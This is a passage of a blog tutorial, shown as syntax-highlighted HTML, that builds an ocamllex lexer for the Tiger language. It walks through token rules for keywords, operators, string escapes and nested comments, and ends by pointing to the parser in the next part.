<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">{</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Lexing</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Syntax</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">open</span> <span style="color:#434f54">Base</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">exception</span> <span style="color:#434f54">SyntaxError</span> <span style="color:#728e00">of</span> <span style="color:#00979d">string</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Next, we need a few regular expressions:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">digit</span> <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#39;0&#39;</span><span style="color:#728e00">-</span><span style="color:#7f8c8d">&#39;9&#39;</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* There are no negative integer literals in Tiger *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#00979d">int</span> <span style="color:#728e00">=</span> <span style="color:#434f54">digit</span><span style="color:#728e00">+</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">frac</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#39;.&#39;</span> <span style="color:#434f54">digit</span><span style="color:#728e00">*</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">exp</span> <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#39;e&#39;</span> <span style="color:#7f8c8d">&#39;E&#39;</span><span style="color:#728e00">]</span> <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#39;-&#39;</span> <span style="color:#7f8c8d">&#39;+&#39;</span><span style="color:#728e00">]?</span> <span style="color:#00979d">int</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#00979d">float</span> <span style="color:#728e00">=</span> <span style="color:#434f54">digit</span><span style="color:#728e00">*</span> <span style="color:#434f54">frac</span><span style="color:#728e00">?</span> <span style="color:#434f54">exp</span><span style="color:#728e00">?</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">white</span> <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#39; &#39;</span> <span style="color:#7f8c8d">&#39;\t&#39;</span><span style="color:#728e00">]+</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">newline</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#39;\r&#39;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\n&#39;</span> <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;</span><span style="color:#7f8c8d">\r\n</span><span style="color:#7f8c8d">&#34;</span>
</span></span></code></pre></div><p>According to <strong>Appendix A</strong>:</p>
<p><em>An <strong>identifier</strong> is a sequence of letters, digits and underscores, starting with a letter. Uppercase letters are distinguished from lowercase</em>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">alphanum</span> <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#39;a&#39;</span><span style="color:#728e00">-</span><span style="color:#7f8c8d">&#39;z&#39;</span> <span style="color:#7f8c8d">&#39;A&#39;</span><span style="color:#728e00">-</span><span style="color:#7f8c8d">&#39;Z&#39;</span> <span style="color:#7f8c8d">&#39;0&#39;</span><span style="color:#728e00">-</span><span style="color:#7f8c8d">&#39;9&#39;</span> <span style="color:#7f8c8d">&#39;_&#39;</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">id</span> <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#7f8c8d">&#39;a&#39;</span><span style="color:#728e00">-</span><span style="color:#7f8c8d">&#39;z&#39;</span><span style="color:#728e00">]</span> <span style="color:#434f54">alphanum</span><span style="color:#728e00">*</span>
</span></span></code></pre></div><p>Lexing rules.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#434f54">rule</span> <span style="color:#434f54">read</span> <span style="color:#728e00">=</span> <span style="color:#434f54">parse</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Whitespaces *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">white</span> <span style="color:#728e00">{</span> <span style="color:#434f54">read</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>We want to skip the new lines.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">newline</span> <span style="color:#728e00">{</span> <span style="color:#434f54">new_line</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">;</span> <span style="color:#434f54">read</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>We have a separate function to read strings (see the
implementation below).</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;&#34;&#39;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">read_string</span> <span style="color:#728e00">(</span><span style="color:#434f54">Buffer</span>.<span style="color:#434f54">create</span> <span style="color:#434f54">16</span><span style="color:#728e00">)</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Again, according the <strong>Appendix A</strong>:</p>
<p><em>A comment may appear between any two tokens. Comments start with <code>/*</code> and end with <code>*/</code> and may be nested.</em></p>
<p>We’ll have a separate function for reading comments (scroll down
to see its code).</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;/*&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">read_comment</span> <span style="color:#728e00">[</span><span style="color:#434f54">lexbuf</span><span style="color:#728e00">.</span><span style="color:#434f54">lex_curr_p</span><span style="color:#728e00">]</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Basic keywords:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;type&#34;</span>     <span style="color:#728e00">{</span> <span style="color:#434f54">TYPE</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;var&#34;</span>      <span style="color:#728e00">{</span> <span style="color:#434f54">VAR</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;function&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">FUNCTION</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;break&#34;</span>    <span style="color:#728e00">{</span> <span style="color:#434f54">BREAK</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;of&#34;</span>       <span style="color:#728e00">{</span> <span style="color:#434f54">OF</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;end&#34;</span>      <span style="color:#728e00">{</span> <span style="color:#434f54">END</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;in&#34;</span>       <span style="color:#728e00">{</span> <span style="color:#434f54">IN</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;nil&#34;</span>      <span style="color:#728e00">{</span> <span style="color:#434f54">NIL</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;let&#34;</span>      <span style="color:#728e00">{</span> <span style="color:#434f54">LET</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;array&#34;</span>    <span style="color:#728e00">{</span> <span style="color:#434f54">ARRAY</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>We need 4 tokens for loops:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;do&#34;</span>    <span style="color:#728e00">{</span> <span style="color:#434f54">DO</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;to&#34;</span>    <span style="color:#728e00">{</span> <span style="color:#434f54">TO</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;for&#34;</span>   <span style="color:#728e00">{</span> <span style="color:#434f54">FOR</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;while&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">WHILE</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Conditionals (<code>if-then-else</code>):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;else&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">ELSE</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;then&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">THEN</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;if&#34;</span>   <span style="color:#728e00">{</span> <span style="color:#434f54">IF</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Operators:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#95a5a6">(* General *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;:=&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">ASSIGN</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Logical *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;|&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">OR</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&amp;&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">AND</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Comparison *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&gt;=&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">GE</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&gt;&#34;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">GT</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&lt;=&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">LE</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&lt;&#34;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">LT</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;&lt;&gt;&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">NEQ</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;=&#34;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">EQ</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Arithmetics *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;/&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">DIVIDE</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;*&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">TIMES</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;-&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">MINUS</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;+&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">PLUS</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Separators:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;.&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">DOT</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;{&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">LBRACE</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;}&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">RBRACE</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;[&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">LBRACK</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;]&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">RBRACK</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;(&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">LPAREN</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;)&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">RPAREN</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;;&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">SEMICOLON</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;:&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">COLON</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;,&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">COMMA</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>Numbers, identifiers, error and EOF handling:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#00979d">int</span> <span style="color:#728e00">{</span> <span style="color:#434f54">INT</span> <span style="color:#728e00">(</span><span style="color:#434f54">Int</span>.<span style="color:#434f54">of_string</span> <span style="color:#728e00">(</span><span style="color:#434f54">Lexing</span>.<span style="color:#434f54">lexeme</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">))</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">id</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">ID</span> <span style="color:#728e00">(</span><span style="color:#434f54">Lexing</span>.<span style="color:#434f54">lexeme</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">)</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#728e00">_</span>   <span style="color:#728e00">{</span> <span style="color:#728e00">raise</span> <span style="color:#728e00">(</span><span style="color:#434f54">SyntaxError</span> <span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;Unexpected character: &#34;</span> <span style="color:#728e00">^</span> <span style="color:#434f54">Lexing</span>.<span style="color:#434f54">lexeme</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">))</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">eof</span> <span style="color:#728e00">{</span> <span style="color:#434f54">EOF</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>The rule to match string literals:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">and</span> <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#728e00">=</span> <span style="color:#434f54">parse</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* If we reach the terminating double quote, then
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">   * we return the contents of the buffer as a STRING. *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;&#34;&#39;</span>       <span style="color:#728e00">{</span> <span style="color:#434f54">STRING</span> <span style="color:#728e00">(</span><span style="color:#434f54">Buffer</span>.<span style="color:#434f54">contents</span> <span style="color:#434f54">buf</span><span style="color:#728e00">)</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Handling escape sequences *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\\&#39;</span> <span style="color:#7f8c8d">&#39;\\&#39;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">Buffer</span>.<span style="color:#434f54">add_char</span> <span style="color:#434f54">buf</span> <span style="color:#7f8c8d">&#39;\\&#39;</span><span style="color:#728e00">;</span> <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\\&#39;</span> <span style="color:#7f8c8d">&#39;/&#39;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">Buffer</span>.<span style="color:#434f54">add_char</span> <span style="color:#434f54">buf</span> <span style="color:#7f8c8d">&#39;/&#39;</span><span style="color:#728e00">;</span>  <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\\&#39;</span> <span style="color:#7f8c8d">&#39;b&#39;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">Buffer</span>.<span style="color:#434f54">add_char</span> <span style="color:#434f54">buf</span> <span style="color:#7f8c8d">&#39;\b&#39;</span><span style="color:#728e00">;</span> <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\\&#39;</span> <span style="color:#7f8c8d">&#39;f&#39;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">Buffer</span>.<span style="color:#434f54">add_char</span> <span style="color:#434f54">buf</span> <span style="color:#7f8c8d">&#39;\012&#39;</span><span style="color:#728e00">;</span> <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\\&#39;</span> <span style="color:#7f8c8d">&#39;n&#39;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">Buffer</span>.<span style="color:#434f54">add_char</span> <span style="color:#434f54">buf</span> <span style="color:#7f8c8d">&#39;\n&#39;</span><span style="color:#728e00">;</span> <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\\&#39;</span> <span style="color:#7f8c8d">&#39;r&#39;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">Buffer</span>.<span style="color:#434f54">add_char</span> <span style="color:#434f54">buf</span> <span style="color:#7f8c8d">&#39;\r&#39;</span><span style="color:#728e00">;</span> <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#39;\\&#39;</span> <span style="color:#7f8c8d">&#39;t&#39;</span>  <span style="color:#728e00">{</span> <span style="color:#434f54">Buffer</span>.<span style="color:#434f54">add_char</span> <span style="color:#434f54">buf</span> <span style="color:#7f8c8d">&#39;\t&#39;</span><span style="color:#728e00">;</span> <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#728e00">[^</span> <span style="color:#7f8c8d">&#39;&#34;&#39;</span> <span style="color:#7f8c8d">&#39;\\&#39;</span><span style="color:#728e00">]+</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">{</span> <span style="color:#434f54">Buffer</span>.<span style="color:#434f54">add_string</span> <span style="color:#434f54">buf</span> <span style="color:#728e00">(</span><span style="color:#434f54">Lexing</span>.<span style="color:#434f54">lexeme</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">);</span>
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">read_string</span> <span style="color:#434f54">buf</span> <span style="color:#434f54">lexbuf</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#728e00">_</span>   <span style="color:#728e00">{</span> <span style="color:#728e00">raise</span> <span style="color:#728e00">(</span><span style="color:#434f54">SyntaxError</span> <span style="color:#728e00">(</span><span style="color:#7f8c8d">&#34;Illegal string character: &#34;</span> <span style="color:#728e00">^</span> <span style="color:#434f54">Lexing</span>.<span style="color:#434f54">lexeme</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">))</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">eof</span> <span style="color:#728e00">{</span> <span style="color:#728e00">raise</span> <span style="color:#728e00">(</span><span style="color:#434f54">SyntaxError</span> <span style="color:#7f8c8d">&#34;String is not terminated&#34;</span><span style="color:#728e00">)</span> <span style="color:#728e00">}</span>
</span></span></code></pre></div><p>The rule to match comments (including nested comments), keeping
a list of where comments open:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">and</span> <span style="color:#434f54">read_comment</span> <span style="color:#434f54">opened</span> <span style="color:#728e00">=</span> <span style="color:#434f54">parse</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Opening comment *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;/*&#34;</span> <span style="color:#728e00">{</span> <span style="color:#434f54">read_comment</span> <span style="color:#728e00">(</span><span style="color:#434f54">lexbuf</span><span style="color:#728e00">.</span><span style="color:#434f54">lex_curr_p</span><span style="color:#728e00">::</span><span style="color:#434f54">opened</span><span style="color:#728e00">)</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Closing comment *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#7f8c8d">&#34;*/&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">{</span> <span style="color:#728e00">match</span> <span style="color:#434f54">opened</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>      <span style="color:#95a5a6">(* No nested opened comments left, continue parsing. *)</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">|</span> <span style="color:#728e00">_::</span><span style="color:#434f54">[]</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">read</span> <span style="color:#434f54">lexbuf</span>
</span></span><span style="display:flex;"><span>      <span style="color:#95a5a6">(* Continue parsing comment. *)</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">|</span> <span style="color:#728e00">_</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">read_comment</span> <span style="color:#728e00">(</span><span style="color:#434f54">List</span>.<span style="color:#434f54">tl_exn</span> <span style="color:#434f54">opened</span><span style="color:#728e00">)</span> <span style="color:#434f54">lexbuf</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">newline</span> <span style="color:#728e00">{</span> <span style="color:#434f54">new_line</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">;</span> <span style="color:#434f54">read_comment</span> <span style="color:#434f54">opened</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#728e00">_</span> <span style="color:#728e00">{</span> <span style="color:#434f54">read_comment</span> <span style="color:#434f54">opened</span> <span style="color:#434f54">lexbuf</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Unexpected end-of-file. Update the current location to
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">   * point to the opening token that wasn&#39;t closed and raise an error. *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">eof</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">{</span> <span style="color:#434f54">lexbuf</span><span style="color:#728e00">.</span><span style="color:#434f54">lex_curr_p</span> <span style="color:#728e00">&lt;-</span> <span style="color:#434f54">List</span>.<span style="color:#434f54">hd_exn</span> <span style="color:#434f54">opened</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">raise</span> <span style="color:#728e00">(</span><span style="color:#434f54">SyntaxError</span> <span style="color:#7f8c8d">&#34;Unterminated comment&#34;</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">}</span>
</span></span></code></pre></div><h4 id="summary">
  Summary
  <a class="heading-link" href="#summary">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>We’ve learned some new things, like <code>ocamllex</code>, but overall, it
wasn’t too hard to follow the book. The full OCaml source code
for the second chapter can be found <a href="https://github.com/vyorkin/tiger/blob/master/chapter2/lexer.mll"  class="external-link" target="_blank" rel="noopener">here</a>. In the next part we’re
going to write a parser.</p>
